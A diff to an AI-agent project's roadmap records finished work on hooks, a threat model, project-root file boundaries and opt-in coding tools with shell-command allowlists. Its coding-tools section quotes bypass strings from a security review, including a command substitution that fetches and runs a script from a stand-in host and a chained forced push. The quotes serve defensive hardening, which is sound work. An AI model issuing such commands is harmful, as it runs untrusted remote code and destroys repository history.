@@ -2,16 +2,15 @@
 
 **Baseline assessment (2026-08-25)**: the core is not dated; the engineering layer
 was roughly where the field stood in late 2023 / early 2024.
-**Progress**: #1-#10, #12, #15, #17, #18, #19 and #20's Stages A and B are done (except
-the fine-grained permissions part of #6). Five items that were never on the roadmap were added after
-reviewing real runs (see "Field patches" at the end).
-Next up: #14 (threat model and allowlists) closes a hole that exists today; then
-#13 (hooks), which is the mechanism #14 wants; then #11 (a better search backend) and
-#16 (multi-provider price overrides, a native Anthropic path), both scoped but not
-started. #20's Stages A (role routing) and B (the bench, and the live table that says
-where the small model breaks) both landed on 2026-09-03; whether its Stage C — routing
-by classified task rather than by call site — is worth the complexity is now a question
-the table can be argued from, and the honest reading of that table is "not yet".
+**Progress**: #1-#10, #12, #13, #14, #15, #17, #18, #19, #20 and #21's Stages A and B
+are done (except the fine-grained permissions part of #6). Five items that were never on
+the roadmap were added after reviewing real runs (see "Field patches" at the end).
+Next up: #11 (a better search backend) and #16 (multi-provider price overrides, a
+native Anthropic path), both scoped but not started. #21's Stages A (role routing) and B
+(the bench, and the live table that says where the small model breaks) both landed on
+2026-09-03; whether its Stage C — routing by classified task rather than by call site —
+is worth the complexity is now a question the table can be argued from, and the honest
+reading of that table is "not yet".
 
 The loop `LLM -> tool call -> tool result -> LLM` is still the core of every agent in
 2026, and not one line of [`loop.py`](../src/teacup_agent/loop.py) is "old technology".
@@ -531,31 +530,72 @@ expensive to find, and one successful load is not proof of reliable loading.
 
 ---
 
-### 13. Hooks
+### 13. Hooks — DONE (2026-09-03)
 
-**Now**: every guardrail is hardcoded in the loop. The per-turn cap, the approval gate and
-the forced wrap-up are all good behaviour, but a user who wants their own rule has to edit
-`loop.py`.
+**Now**: every guardrail was hardcoded in the loop. The per-turn cap, the approval gate and
+the forced wrap-up are all good behaviour, but a user who wants their own rule had to edit
+`loop.py`. It is also the mechanism #14 needs: an allowlist and an output audit are both
+hooks, and adding them as hooks means the loop does not grow a security section.
 
-**Why it is worth it**: the harness chapter of the SDLC paper lists hooks as a first-class
-component, "deterministic code that runs at specific lifecycle points: before a tool call,
-after a file edit, before a commit. Hooks are the place for things the agent should never
-forget but often does." It is also the mechanism #14 needs: an allowlist and an output
-audit are both hooks, and adding them as hooks means the loop does not grow a security
-section.
+**What shipped**: [`hooks.py`](../src/teacup_agent/hooks.py) — a small registry of three
+callbacks, loaded from a project-local `hooks.py` (the same opt-in-by-file convention as
+`mcp.json`/`skills/`, wired via a new `--hooks` flag and `_resolve_hooks()` in `cli.py`,
+mirroring `_resolve_mcp`/`_resolve_skills`):
 
-**How**: a small registry of callbacks at named points, most usefully `before_tool_call`
-(may veto, returning a string that becomes the tool result) and `after_tool_result` (may
-rewrite). Load them from `hooks.py` in the project, the same opt-in-by-file convention as
-`mcp.json` and `skills/`.
+- `before_tool_call(call) -> str | None` — a string vetoes the call (it becomes the
+  call's `ERROR:` result, same shape a denial already gets); `None` allows it through.
+  Wired into `execute_calls()` in `loop.py`, checked **before** the approval gate, so a
+  vetoed call never reaches "ask for approval."
+- `after_tool_result(call, result) -> str` — may rewrite the result that reaches the
+  model. Wired in right before a result is emitted/externalized/traced.
+- `approve_tool_call(call, spec) -> bool | None` — the one hook that can say **yes**
+  with nobody watching, and only because the project itself declared that trust. Kept
+  separate from `before_tool_call` on purpose: a veto hook can only refuse, this one can
+  approve, which is a materially different kind of power and needed its own name and its
+  own opt-in (`--approve hooks`, a new fourth policy alongside `auto`/`deny`/`allow` in
+  `_make_approver`). Returning `None` (including "no `hooks.py` was loaded at all") falls
+  through to `auto`'s own ask-if-there-is-a-TTY / deny-otherwise behaviour, so `--approve
+  hooks` is safe to leave on even for calls the project's `hooks.py` never mentions.
 
-**Definition of done**: a project-local hook can block a tool call by argument (not just
-by tool name) without touching `loop.py`, and the veto reaches the model as a normal
-`ERROR:` result.
+**Failure handling is deliberately asymmetric**, because the three callbacks are not
+symmetric risks: a broken `before_tool_call` fails **closed** (an exception becomes a
+veto — a broken safety check must not silently stop being one); a broken
+`approve_tool_call` fails to "no opinion" (also closed, since that already means deny
+without a TTY); a broken `after_tool_result` fails to a no-op (it is a transform, not a
+gate, so silence is the safe fallback — the same "a broken planner must never stop the
+run" discipline `plan.py`/`reflect.py` already hold).
+
+**A departure from the mcp.json/agent.yaml convention, stated on purpose**: those two are
+gitignored because they can carry credentials. `hooks.py` carries policy, not secrets, and
+an unattended run trusting it to approve calls is exactly the kind of change that should
+be reviewed in version control, not hidden from it — so it is **not** added to
+`.gitignore`. See `docs/threat-model.md`.
+
+`hooks.example.py` demonstrates the mechanism end to end using the existing `send_email`
+tool and zero new tools — exactly the example this item originally asked for
+("send_email only to these domains"): `before_tool_call` refuses a recipient outside the
+allowlist, `approve_tool_call` says yes for one that is on it, so an unattended run can
+actually send the approved mail instead of every send being denied for lack of a TTY.
+
+**Definition of done**: a project-local hook blocks a tool call by argument (not just by
+tool name) without touching `loop.py`'s own code, and the veto reaches the model as a
+normal `ERROR:` result — pinned by `tests/test_hooks.py`.
+
+**Verification**:
+```
+uv run pytest                          # includes tests/test_hooks.py
+uv run python -m teacup_agent.evals    # loop health, scripted model, free
+uv run teacup-agent                    # offline demo unaffected (no hooks.py by default)
+```
 
 ---
 
-### 14. Threat model, and tool-call allowlists
+### 14. Threat model, and tool-call allowlists — DONE (2026-09-03)
+
+**Update**: `docs/threat-model.md` now also documents #13's hooks mechanism (the
+argument-aware allowlist example this item asked for, `hooks.example.py`, is real and
+runnable — see that file's own writeup below and `docs/threat-model.md`'s "What #13
+added" section).
 
 **Now**: the docs state that web content and MCP tool descriptions are untrusted text the
 model reads, and then nothing is done about it. Documenting a risk without marking the
@@ -629,19 +669,53 @@ different axes, not strong and weak versions of one thing.
   stay readable because the model already saw them, while a run's `state.json` does not,
   because it holds the system prompt and every result of that run. Both halves are
   tested, and the externalization round trip was verified end to end afterwards;
-- **root `read_file` at an explicit project root instead of `Path.cwd()`** (exposure 3),
-  resolved once at startup from the CLI's working directory and passed in, so the
-  boundary is a stated fact of the run rather than a property of the user's shell;
-- argument-aware allowlists as hooks (#13), e.g. "send_email only to these domains";
-- a `docs/threat-model.md` that states plainly what is trusted, what is not, and what this
-  repo does *not* defend against — including that a stdio MCP server is unsandboxed code
-  execution — so a fork knows what it is inheriting.
+- ✅ **done**: `read_file` at an explicit project root instead of `Path.cwd()`
+  (exposure 3), resolved once at startup from the CLI's working directory and passed in,
+  so the boundary is a stated fact of the run rather than a property of the user's shell;
+- ✅ **done, in a follow-up round**: argument-aware allowlists as hooks — #13's
+  `hooks.py`/`before_tool_call` shipped after this item did (this item's own definition
+  of done never required it); see #13 above and `docs/threat-model.md`;
+- ✅ **done**: a `docs/threat-model.md` that states plainly what is trusted, what is not,
+  and what this repo does *not* defend against — including that a stdio MCP server is
+  unsandboxed code execution — so a fork knows what it is inheriting.
+
+**What shipped**: [`tools.py`](../src/teacup_agent/tools.py) gained a module-level
+`_project_root` (default `None`, falling back to `Path.cwd()` when unset — every existing
+test keeps working unchanged) plus `set_project_root()`; `read_file` reads it instead of
+recomputing `Path.cwd()` on every call. `cli.py` gained `--project-root PATH`, resolved
+once at the top of `main()` and threaded three places: `tools.set_project_root()`, and
+into the two already-existing (previously unused) `root=` parameters on
+`_resolve_mcp`/`_resolve_skills` — closing the same "implicit `Path.cwd()` per call"
+pattern everywhere it existed, not just in `read_file`. This gives "project root" and "the
+directory the process launched from" a real seam to diverge through, which is what makes
+the definition-of-done test meaningful rather than vacuous: before this, the two were
+definitionally the same value, so there was no way to write a test where a file was
+"outside the project root but inside the launch directory" at all.
 
 **Definition of done**:
-- `read_file` refuses a file that is outside the project root but inside the directory
-  the process was launched from, with a test that pins it by launching from elsewhere;
-- `docs/threat-model.md` exists and names MCP child processes as the one unsandboxed
+- ✅ `read_file` refuses a file that is outside the project root but inside the directory
+  the process was launched from —
+  `tests/test_tools.py::test_project_root_can_be_set_independent_of_the_launch_directory`
+  pins it (launch from one directory, set the root to a different one, confirm the launch
+  directory's own file is refused);
+- ✅ `docs/threat-model.md` exists and names MCP child processes as the one unsandboxed
   code-execution path.
+
+**Verification**:
+```
+uv run pytest                          # 210 passed
+uv run python -m teacup_agent.evals    # 21/21 passed
+uv run teacup-agent                    # offline demo unaffected, still instant
+```
+Manual check (`--project-root` diverging from the launch directory, over the real
+`cli.main()` entry point):
+```
+$ cd /tmp/proot_launch   # holds secret.txt
+$ python -c "cli.main(['--project-root', '/tmp/proot_project', '-q', 'noop']); ..."
+after main(): project root is /tmp/proot_project
+ERROR: no such file: secret.txt          # launch dir's file: refused
+readable                                 # /tmp/proot_project/notes.md: allowed
+```
 
 **Reference**: <https://www.sysdig.com/learn-cloud-native/prompt-injection> ·
 <https://www.firecrawl.dev/blog/ai-agent-sandbox>
@@ -871,7 +945,125 @@ uv run teacup-agent                    # offline demo unaffected (reflect defaul
 
 ---
 
-### 20. Model routing: several profiles in one run — Stages A and B DONE (2026-09-03)
+### 20. Coding tools: list_files/edit_file/write_file/run_command — DONE (2026-09-04)
+
+**Now**: every tool so far is read-only or a narrow, curated side effect
+(`send_email`). Nothing writes a file or runs a command, so this agent could
+research a repository but never change it — the gap named explicitly in `AGENTS.md`'s
+precondition, *"a code-execution tool must not be added until a sandbox exists to run
+it in."* A sandbox exists now (teacup-run's sandboxed subprocess launcher, plus #13's
+hooks-based approval for unattended runs), so this item is what that precondition was
+blocking.
+
+**What shipped**: a new [`coding_tools.py`](../src/teacup_agent/coding_tools.py),
+mirroring `subagent.py`'s `enable()`/`disable()` shape (`tools_mod.REGISTRY` mutated
+directly, not the always-on `@tool` decorator) so these four tools do not exist in the
+registry — and cost no prefix tokens — unless a new `--coding-tools` flag is passed
+(`loop.run(coding_tools=True)`, same opt-in convention as `--subagents`/`--mcp`/
+`--skills`):
+
+- **`list_files(path=".", recursive=False)`** — read-only, ungated. The gap found
+  while designing this item, not in the original sketch: without a way to discover
+  what files exist, `read_file`'s exact-path requirement makes a coding agent pointed
+  at an unfamiliar repo unable to find anything to read or edit except by guessing.
+  Filtered through `tools._is_denied()` (recursive walks prune a denied directory like
+  `.venv` before descending into it, not after — `os.walk`'s `dirnames[:]` in place).
+- **`edit_file(path, old_string, new_string)`** — `requires_approval=True`. Exact-
+  substring replace: reads the file fresh every time (never trusts a possibly-stale
+  view the model formed earlier), errors on zero or more than one match rather than
+  guessing which one was meant. This is the primary editing primitive, not
+  `write_file`.
+- **`write_file(path, content)`** — `requires_approval=True`, **new files only**.
+  Errors if `path` already exists (use `edit_file` for that) — a structural fix, not
+  a convention: a stale or truncated view of an existing file cannot silently
+  overwrite it through this tool, because this tool cannot overwrite anything.
+- **`run_command(command, timeout=None)`** — `requires_approval=True`, `shell=True`,
+  cwd = the project root. Passes `timeout` straight to `subprocess.run` itself, which
+  actually terminates the child process — strictly stronger containment for this one
+  tool than the loop's own generic per-call timeout (`tool_timeout`), which can only
+  abandon a stuck thread, never kill it. The requested timeout is clamped to a fixed
+  maximum (300s) so a model cannot ask for an unbounded run.
+- **Fixed `read_file`'s unconditional 2000-character cap** (`tools.py`): now returns
+  the full file and lets the loop's existing `EXTERNALIZE_OVER` excerpt-with-a-path
+  mechanism (already built for exactly this) do the truncation job. The old cap was a
+  latent data-loss hazard once an editing tool existed — a model editing from a
+  truncated view could silently clobber the part it never saw.
+- **`hooks.example.py`** extended with a `run_command` allowlist: `git status`/
+  `diff`/`add`/`commit`/`log` and `uv run pytest`/`uv run ruff` are approved via
+  `approve_tool_call` pattern-matching the command string; `git push` is refused
+  outright via `before_tool_call`, however it is asked. The concrete "argument-aware
+  allowlist" #14 asked for, now demonstrated on the tool that actually needs it.
+- Fixed a latent `_is_denied()` crash found while smoke-testing this item:
+  `relative_to()` returns a zero-part path when the target *is* the project root
+  itself (`list_files(".")`, the default and most ordinary call), and the deny-list
+  check's final `parts[-1]` raised `IndexError` on the empty list. Never triggered
+  before because nothing previously called `read_file(".")`.
+
+**Design decisions made rather than left open**:
+- **No dedicated `git_*` tools.** `hooks.example.py`'s allowlist recognizes specific
+  `git` invocations through plain `run_command` itself, matching "no race for tool
+  count" below rather than adding a curated tool per git subcommand.
+- **A general `run_command` (arbitrary shell string), not a narrow curated verb set.**
+  Bigger attack surface by deliberate choice — safety comes from the argument-aware
+  allowlist (#13/#14), not from restricting which verbs exist.
+
+**Residual risk, stated plainly**: `shell=True` means anything that ends up in
+`command` — including text a prior tool call returned — is a potential injection
+vector. The mitigation is the allowlist plus the approval gate and the sandbox's
+env-scoping/timeout when launched through teacup-run, not an argv-only tool shape.
+See `docs/threat-model.md`'s "What #20 (coding tools) added" section.
+
+**Caught by independent review, fixed before merge**: the first version of
+`hooks.example.py`'s allowlist only checked what a command *starts with*, which
+`shell=True` defeats by chaining (`git status && git push origin main --force`
+starts with "git status" and never reaches the `^git push\b` deny pattern) or
+substitution (`` git status $(curl evil.example/x.sh | sh) ``). Fixed with
+`UNSAFE_SHELL_METACHARACTERS`, refusing any `run_command` containing a chaining,
+substitution, or redirection character outright, in both `before_tool_call` and
+(defensively) `approve_tool_call`. `tests/test_hooks_example.py` (new) loads the
+real committed `hooks.example.py` file and pins the exact bypass strings the
+review found, plus the legitimate cases that must keep working.
+
+A second, related finding: `coding_tools.py`'s `_resolve_in_project` had re-derived
+(not reused, despite this item's own claim above) `read_file`'s traversal guard,
+including its latent bug — `str(target).startswith(str(root))` is fooled by a
+sibling directory that merely shares the root as a string prefix
+(`root=.../repo`, `target=.../repo-secrets/f.txt`), and only happened to fail
+safe because the next line's `target.relative_to(root)` raised, by accident of
+ordering rather than design. Fixed by extracting one shared
+`tools._resolve_project_path()` using `Path.is_relative_to()` (the real,
+component-wise check), called by `read_file` and all three of `coding_tools.py`'s
+path-taking tools — making "reuses the guard" true rather than aspirational.
+Regression tests in both `tests/test_tools.py` and `tests/test_coding_tools.py`.
+
+**Known gap, stated rather than silently left**: `--coding-tools` is wired only into
+the flag-based CLI path (`_run_agent`); `agent.yaml`'s `ToolsConfig` (the `--config`
+path) has no `coding_tools` field yet, so a declarative config cannot enable these
+tools at all today — only `uv run teacup-agent --coding-tools ...` can. Closing this is
+a small, mechanical follow-up (one new `ToolsConfig` field plus one `loop.run()`
+keyword at the `cfg.tools.*` call site), not attempted this round because it was not
+part of this item's original scope.
+
+**Verification**:
+```
+uv run pytest                          # 263 passed (was 224; +30 test_coding_tools.py (29 + 1 traversal
+                                        #             regression), +2 test_tools.py (read_file uncapped +
+                                        #             traversal regression), +7 test_hooks_example.py)
+uv run python -m teacup_agent.evals    # 21/21 passed
+uv run teacup-agent                    # offline demo unaffected, still instant (coding tools off by default)
+```
+Live smoke test (offline, `ScriptedModel`, no API key/network/cost): `--coding-tools`
+plus `--hooks hooks.example.py --approve hooks` against a scratch copy of this repo —
+`list_files`/`read_file` ran ungated; `write_file`/`edit_file` were correctly denied
+(the hooks file has no opinion on them, and "no opinion" falls through to
+deny-without-a-TTY, exactly as designed); `run_command("git status --porcelain")` was
+approved by the allowlist and actually ran, returning real `git status` output;
+`run_command("git push origin main")` was vetoed outright by `before_tool_call` before
+ever reaching the approval gate.
+
+---
+
+### 21. Model routing: several profiles in one run — Stages A and B DONE (2026-09-03)
 
 **Now**: `agent.yaml` already holds a *map* of model profiles (#15), but only
 `models.default` is ever built — `build_model()` is called once and that one object is
@@ -1157,7 +1349,7 @@ the default does not move on this evidence.**
   `gpt-5-mini`. The same five on `gpt-5` would be roughly five times that — call it
   $0.12, about what the entire rest of that run cost. That is an inference from the
   price table, not a measurement, but it is the right order of magnitude and it
-  confirms what #20 predicted: `compact` has the largest input in the repo, so it is
+  confirms what #21 predicted: `compact` has the largest input in the repo, so it is
   where the money is.
 - **Quality: not readable at n=1, and the one internal check argues against the
   worry.** `compact-small` scored grounding 2 / honesty 2 with 2 unsupported citations,
@@ -1344,8 +1536,12 @@ feature it was meant to justify.
   is #18's optional A2A server: a second console script behind a separate install extra,
   never loaded by `uv run teacup-agent`, added because Agent2Agent interop needs an agent
   that can be called into, not because this became a service project.
-- **No race for tool count.** Five tools demonstrate every mechanism; if you want more
-  tools, go through MCP (#9).
+- **No race for tool count.** A small, curated set demonstrates every mechanism; if you
+  want more tools, go through MCP (#9). #20's four coding tools are the one deliberate
+  exception — they exist because the mechanism itself (writing files, running commands)
+  was the missing capability, not because more tools were wanted for their own sake, and
+  they stay opt-in behind `--coding-tools` precisely so a run that does not need them
+  pays nothing for their existence.
 
 ---
 
@@ -1356,7 +1552,7 @@ Want it to sustain **longer work** -> #4 (context compaction).
 Want it **faster** -> #5 (parallel tools).
 Want it **trustworthy** -> #7 (trajectory eval).
 Want it to **do more** -> #9 (MCP).
-Want it **cheaper** -> #20 (model routing), but measure before you route.
+Want it **cheaper** -> #21 (model routing), but measure before you route.
 
 ---
 
@@ -1365,7 +1561,7 @@ Want it **cheaper** -> #20 (model routing), but measure before you route.
 None of these were on the original roadmap; they came out of running real tasks. A-F
 share a root cause: the loop was not wrong, the **model was missing the information it
 needed to decide**. G and H came later and from a different place — the first live
-routing bench (#20 Stage B) — and share a different one: **a green test suite only
+routing bench (#21 Stage B) — and share a different one: **a green test suite only
 covers the shapes it was written in.**
 
 ### A. Tell the model what day it is — DONE
@@ -1508,7 +1704,7 @@ turns out to be different from what it looked like, is not implemented.
 
 ### G. Compaction orphaned a function_call from its reasoning — DONE (2026-09-03)
 
-**Symptom**: two of the three `long-context` cells in #20's first live bench run died
+**Symptom**: two of the three `long-context` cells in #21's first live bench run died
 mid-run, both with the same 400:
 
 ```
